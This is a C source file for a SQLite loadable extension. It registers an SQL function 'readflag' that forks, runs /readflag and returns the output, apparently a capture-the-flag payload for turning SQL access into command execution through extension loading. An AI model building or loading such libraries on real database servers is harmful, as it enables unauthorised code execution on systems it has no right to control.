#include <stddef.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* Minimal declarations needed by a loadable SQLite extension. */
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_context sqlite3_context;
typedef struct sqlite3_value sqlite3_value;
typedef struct sqlite3_api_routines sqlite3_api_routines;

extern int sqlite3_create_function_v2(
    sqlite3 *, const char *, int, int, void *,
    void (*)(sqlite3_context *, int, sqlite3_value **),
    void (*)(sqlite3_context *, int, sqlite3_value **),
    void (*)(sqlite3_context *), void (*)(void *));
extern void sqlite3_result_text(sqlite3_context *, const char *, int,
                                void (*)(void *));
extern void sqlite3_result_error(sqlite3_context *, const char *, int);

#define SQLITE_UTF8 1
#define SQLITE_TRANSIENT ((void (*)(void *))-1)

static void run_readflag(sqlite3_context *ctx, int argc, sqlite3_value **argv) {
    (void)argc;
    (void)argv;

    int fds[2];
    char output[512];
    int used = 0;

    if (pipe(fds) != 0) {
        sqlite3_result_error(ctx, "pipe failed", -1);
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        close(fds[0]);
        dup2(fds[1], STDOUT_FILENO);
        close(fds[1]);
        execl("/readflag", "readflag", (char *)NULL);
        _exit(127);
    }
    close(fds[1]);

    if (pid < 0) {
        close(fds[0]);
        sqlite3_result_error(ctx, "fork failed", -1);
        return;
    }

    while (used < (int)sizeof(output) - 1) {
        ssize_t n = read(fds[0], output + used, sizeof(output) - 1 - used);
        if (n <= 0) break;
        used += (int)n;
    }
    close(fds[0]);
    waitpid(pid, NULL, 0);
    output[used] = '\0';
    sqlite3_result_text(ctx, output, used, SQLITE_TRANSIENT);
}

__attribute__((visibility("default")))
int sqlite3_extension_init(sqlite3 *db, char **errmsg,
                           const sqlite3_api_routines *api) {
    (void)errmsg;
    (void)api;
    return sqlite3_create_function_v2(db, "readflag", 0, SQLITE_UTF8, NULL,
                                      run_readflag, NULL, NULL, NULL);
}
